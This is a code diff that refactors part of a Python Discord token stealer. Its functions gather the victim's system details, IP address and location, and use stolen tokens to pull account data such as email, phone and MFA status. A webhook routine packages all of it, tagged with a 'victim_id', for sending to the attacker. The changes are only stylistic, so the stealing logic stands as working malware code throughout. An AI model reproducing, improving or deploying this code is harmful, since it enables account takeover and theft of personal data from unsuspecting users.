@@ -55,7 +55,7 @@ def givetokens():
 	return working
 
 def getpcinfo(): # grab pc info
-	info = {
+	return {
 	'os': platform.system(),
 	'platform': platform.platform(),
 	'os_ver': platform.version(),
@@ -66,11 +66,9 @@ def getpcinfo(): # grab pc info
 	'ram': str(round(psutil.virtual_memory().total / (1024.0 **3)))+' GB'
 	}
 
-	return info
-
 def getipinfo():
 	data = json.loads(requests.get('https://wtfismyip.com/json').content)
-	info = {
+	return {
 	'pub_ip': data['YourFuckingIPAddress'],
 	'priv_ip': socket.gethostbyname(socket.gethostname()),
 	'loc': data['YourFuckingLocation'],
@@ -80,23 +78,21 @@ def getipinfo():
 	'cc': data['YourFuckingCountryCode']
 	}
 
-	return info
-
 def getcordinfo(token):
 	re = requests.get('https://discordapp.com/api/v7/users/@me', headers={'Content-Type': 'application/json', 'Authorization': token})
 	data = json.loads(re.content)
-	info = {
-	'id': data['id'],
-	'name': data['username'],
-	'tag': data['discriminator'],
-	'fullname': f'{data["username"]}#{data["discriminator"]}',
-	'avatar': f'https://cdn.discordapp.com/avatars/{data["id"]}/{data["avatar"]}.jpg',
-	'mfa': data['mfa_enabled'],
-	'email': data['email'],
-	'phone': data['phone'],
-	'verified': data['verified']
+	return {
+	    'id': data['id'],
+	    'name': data['username'],
+	    'tag': data['discriminator'],
+	    'fullname': f'{data["username"]}#{data["discriminator"]}',
+	    'avatar':
+	    f'https://cdn.discordapp.com/avatars/{data["id"]}/{data["avatar"]}.jpg',
+	    'mfa': data['mfa_enabled'],
+	    'email': data['email'],
+	    'phone': data['phone'],
+	    'verified': data['verified'],
 	}
-	return info
 
 def sendhook(hook):
 	try:
@@ -107,9 +103,7 @@ def sendhook(hook):
 		victim_id = hashlib.md5(getipinfo()["pub_ip"].encode()).hexdigest()
 		embed_color = random.choice(colors)
 		token_list = givetokens()
-		tokens = ''
-		for i in token_list:
-			tokens += f'{i}\n'
+		tokens = ''.join(f'{i}\n' for i in token_list)
 		data['embeds'] = [
 		{
 			'author': {
